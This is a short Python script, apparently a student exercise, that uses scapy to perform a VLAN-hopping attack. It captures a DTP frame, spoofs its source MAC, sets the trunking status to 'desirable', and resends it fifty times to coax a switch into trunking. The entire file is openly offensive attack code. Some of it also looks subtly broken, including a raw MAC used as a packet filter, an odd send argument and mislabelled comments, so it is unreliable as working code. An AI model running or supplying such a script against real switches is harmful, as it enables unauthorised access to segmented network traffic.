# This function import scapy so that we can use the sniff command
from scapy.all import *
load_contrib("dtp")

def Vlan_jumping():
    # This function gives the user a choice of which DTP MAC address to use
    User_input = input('Enter the MAC address that spaningTree use >>> ')
    # This function sniffes for the MAC address that the user has entered
    pkt = sniff(filter=User_input,count = 1)
    # This function changes the MAC address
    pkt[0].src = "00:00:00:11:11:11"
    # This function changes the disirable
    pkt[0][DTP][DTPStatus].status = '\x03'
    # This function sends the packet into the network
    for i in range(0, 50):
        sendp(pkt[0], loop = 0, version = 0)
        time.sleep(5)